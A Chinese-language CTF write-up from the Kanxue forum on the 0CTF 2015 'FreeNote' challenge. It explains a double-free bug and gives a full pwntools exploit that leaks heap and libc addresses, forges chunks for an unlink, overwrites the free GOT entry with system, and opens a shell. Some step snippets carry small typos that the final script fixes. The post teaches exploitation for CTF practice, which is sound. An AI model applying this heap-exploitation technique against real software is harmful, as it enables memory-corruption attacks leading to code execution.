# [原创]0CTF 2015 FreeNote 
https://bbs.kanxue.com/thread-226287.htm

## 序言
> 又一个Double Free类型的题, 虽说是Double Free, 但利用方式不一样, 有需要的看一下.

## 程序运行(简单运行)
1. MENU
```
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice:
```

2. List
```
Your choice: 1
0. 1234567
```

3. New
```
Your choice: 2
Length of new note: 8
Enter your note: 1234567
Done.
```

4. Edit
```
Your choice: 3
Note number: 0
Length of note: 32 
Enter your note: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Done.
```

5. Delete
```
Your choice: 4
Note number: 0
Done.
```
## 程序分析
### Tips
> 个人觉得漏洞的发现也是一个较为重要的过程, 需要重视起来, 相当于渗透测试中的信息收集.对这个程序越是熟悉, 我们越是能够发现和利用漏洞.

### 0. Struct

```c
struct node{
  int flag;
  int length;
  char* s;
}
```
### 1. New

> 通过对程序的观察, 发现程序会malloc最小的数值, 0x80, 然后是0x180
. 程序将这些flag, length, s存放在堆中.

 
### 2. Delete

> 没有对相应的指针作验证, 出现Double Free

## 漏洞分析
思路: 总体思路还是和SleepyHolder一样, Double Free和Unlink搭配实现任意地址读写.

问题:　如何实现Double Free而不致使程序崩掉呢?

> 我们知道: Free一个结构体, 程序会将flag和length置为0, free对应的指针, 但是没有将其置为0, 于是就出现了如下假设:

> 如果释放后的对应位置仍然有内容, 那么我们就能二次释放, 而不使程序崩掉.并且释放的位置上出现Unlink, 我们就改写任意内容.

## 过程
1. leak heap address && libc base address

```python
new(1, 'a')
new(8, 'a')
new(8, 'a')
new(8, 'a')
 
delete(0)
delete(2)
 
new(8, '12345678')
new(8, '12345678')
 
list()
p.recvuntil("0. 12345678")
heap = u64(p.recvline().strip("\x0a").ljust(8, "\x00") - 0x1940)
p.recvuntil("2. 12345678")
libcbase = u64(p.recvline().strip("\x0a").ljust(8, "\x00")) - 0x3c4b78
log.info("heap: %s" % hex(heap))
log.info("libcbase: %s" % hex(libcbase))
 
delete(1)
delete(3)
```
结论: 利用了unsorted bin中是双链表连接.

 
2. Double Free
```python
payload01 = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10)
payload01 += "A"*0x30 + p64(0x50) +p64(0x20)
new(len(payload01), payload01)
#------------------------------------------------------
------ #0x962830:    0x0000000000000000    0x0000000000000051  <---------        
|      #0x962840:    0x0000000000961018(fd)    0x0000000000961020(bk)   |
|      #0x962850:    0x4141414141414141    0x4141414141414141           |
|      #0x962860:    0x4141414141414141    0x4141414141414141           |
|      #0x962870:    0x4141414141414141    0x4141414141414141           |
--->   #0x962880:    0x0000000000000050(绕过)    0x0000000000000020 ------|
#-----------------------------------------------------       |
                                                             |
payload02  = "A"*0x80 + p64(0x110) + p64(0x90) + "A"*0x80    |
payload02 += p64(0) + p64(0x71) + "A"*0x60                   |
new(len(payload02), payload02)                               |
delete(2)                                                    |
#-----------------------------------------------------       |
#0x962920:    0x4141414141414141    0x4141414141414141           |
#0x962930:    0x4141414141414141    0x4141414141414141           |
#0x962940:    0x0000000000000110(prevsize)    0x0000000000000090 |
#0x962950:    0x4141414141414141    0x4141414141414141
#0x962960:    0x4141414141414141    0x4141414141414141
#-----------------------------------------------------
```
简单说明:
```
0x962940 - 0x110 = 0x962830,　 //找到前一个chunk
0x962830 + 0x50 = [0x962880]  //验证是否相等, 不相等直接报错
 
[fd + 0x18] = bk
[bk + 0x10] = fd
结果是
-----------------------------
0x961010:    0x0000000000000100    0x0000000000000001
0x961020:    0x0000000000000001    0x0000000000000060
0x961030:    0x0000000000961018(可控区域)    0x0000000000000001
0x961040:    0x0000000000000180    0x00000000009628c0
-----------------------------
```
3. modify
```python
free_got = elf.got['free']
system = libcbase + libc.sysbols['system']
 
payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + "A" * 0x40
payload04 = p64(system)
 
edit(0, 0x60, payload03)
edit(0, 0x8, payload04)
 
payload05 = "/bin/sh\x00"
new(len(payload05), payload05)
delete(4)
```
## 完整EXP
```python
from pwn import *
 
p = process("./freenote")
elf = ELF("./freenote")
libc = ELF("./libc.so.6")
context.log_level = 'debug'
 
def list():
    p.recvuntil("Your choice: ")
    p.sendline("1")
 
def new(length, note):
    p.recvuntil("Your choice: ")
    p.sendline("2")
    p.recvuntil("new note: ")
    p.sendline(str(length))
    p.recvuntil("note: ")
    p.send(note)
 
def edit(index, length, note):
    p.recvuntil("Your choice: ")
    p.sendline("3")
    p.recvuntil("Note number: ")
    p.sendline(str(index))
    p.recvuntil("Length of note: ")
    p.sendline(str(length))
    p.recvuntil("Enter your note: ")
    p.send(note)
 
def delete(index):
    p.recvuntil("Your choice: ")
    p.sendline("4")
    p.recvuntil("Note number: ")
    p.sendline(str(index))
 
def exit():
    p.recvuntil("Your choice: ")
    p.sendline("5")
 
#leak address
new(1, 'a')
new(1, 'a')
new(1, 'a')
new(1, 'a')
 
delete(0)
delete(2)
 
new(8, '12345678')
new(8, '12345678')
 
list()
p.recvuntil("0. 12345678")
heap = u64(p.recvline().strip("\x0a").ljust(8, "\x00")) - 0x1940
p.recvuntil("2. 12345678")
libcbase = u64(p.recvline().strip("\x0a").ljust(8, "\x00")) - 0x3c4b78
 
log.info("heap: %s" % hex(heap))
log.info("libc_base: %s" % hex(libcbase))
 
delete(3)
delete(2)
delete(1)
delete(0)
 
#double link
gdb.attach(p)
payload01  = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10)
payload01 += "A"*0x30 + p64(0x50) + p64(0x20)
new(len(payload01), payload01)
 
payload02  = "A"*0x80 + p64(0x110) + p64(0x90) + "A"*0x80
payload02 += p64(0) + p64(0x71) + "A"*0x60
new(len(payload02), payload02)
delete(2)
 
 
 
#change
 
free_got = elf.got['free']
system = libcbase + libc.symbols['system']
 
payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + "A"*0x40
payload04 = p64(system)
 
#
edit(0, 0x60, payload03)
edit(0, 0x8, payload04)
 
payload05 = "/bin/sh\x00"
new(len(payload05), payload05)
delete(4)

p.interactive()
```